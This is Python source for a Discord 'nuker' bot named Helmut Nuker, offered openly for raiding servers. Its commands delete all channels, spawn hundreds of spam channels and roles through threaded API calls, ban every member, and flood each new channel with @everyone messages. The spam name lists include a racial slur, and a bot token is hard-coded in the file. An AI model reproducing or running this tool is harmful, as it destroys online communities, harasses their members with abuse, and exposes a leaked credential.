import discord
from discord.ext import commands
import asyncio
import colorama
from colorama import Fore
import requests
import threading
import random

token = "OTYzNDU2OTU1OTQxMjczNjAw.G7zgia.4G1ZdDmFNTMBzF6cdUPijcQyvzcc_pK4F4jt9Q"
prefix = "%"
intents = discord.Intents.all()

helmut = commands.Bot(command_prefix=prefix, intents= intents, help_command=None)

headers = {
    "Authorization": f"Bot {token}" 
    }

spam_message = ["@everyone nuked","@everyone get raided"]
spam_channel = ["raided","nuked","lol","niggers"]
spam_roles = ["lol","nuked","niggers"]

@helmut.event
async def on_ready():
    print('''

 _   _      _                 _   
| | | | ___| |_ __ ___  _   _| |_
| |_| |/ _ \ | '_ ` _ \| | | | __|
|  _  |  __/ | | | | | | |_| | |_
|_| |_|\___|_|_| |_| |_|\__,_|\__|
    Made by Black and Kosef


''')
    await helmut.change_presence(activity=discord.Streaming(name="Helmut Nuker", url="https://www.twitch.tv/#"))
    await print(f"[+]Connected as {helmut.user}")
    await print(f"[+]ID : {helmut.user.id}")

@helmut.command()
async def help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(
        title="Helmut Nuker",
        description=f"""```
{prefix}nuke - Destroy the Guild
{prefix}cdel - Delete all Channels
{prefix}ccr <amount> - Create Channels
{prefix}rcr <amount> - Create Roles
{prefix}massban - Ban all members```
""",
    )
    embed.set_image(url="https://tenor.com/view/soldier-gif-14847526")
    await ctx.send(embed=embed)

@helmut.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.GREEN + f"{channel.name} was deleted" + Fore.RESET)
        except:
                print(Fore.MAGENTA + f"{channel.name} was not deleted" + Fore.RESET)
                await guild.create_text_channel("lol")
                for i in range(500):
                    try:
                        await guild.create_text_channel(random.choice(spam_channel))
                    except:
                            pass

@helmut.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(spam_message))

def channel_create(guild_id):
    payload = {
        "name": random.choice(spam_channel),
        "permission_overwrites": [],
        "type": 0
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass

@helmut.command()
async def ccr(ctx, amount: int):
    await ctx.message.delete()
    for i in range(amount):
        threading.Thread(target=channel_create, args=(ctx.guild.id,)).start()

def delete_channel(channel_id):
    try:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
    except:
            pass

@helmut.command()
async def cdel(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        threading.Thread(target=delete_channel, args=(channel.id,)).start()

@helmut.command()
async def massban(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
          pass

def create_roles(guild_id):
    payload = {
        "name" : random.choice(spam_roles),
        "color": random.randint(0, 0xffffff)   
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=payload)
    except:
            pass

@helmut.command()
async def rcr(ctx, amount: int):
    await ctx.message.delete()
    for i in range(amount):
        threading.Thread(target=create_roles, args=(ctx.guild.id,)).start()


helmut.run(token)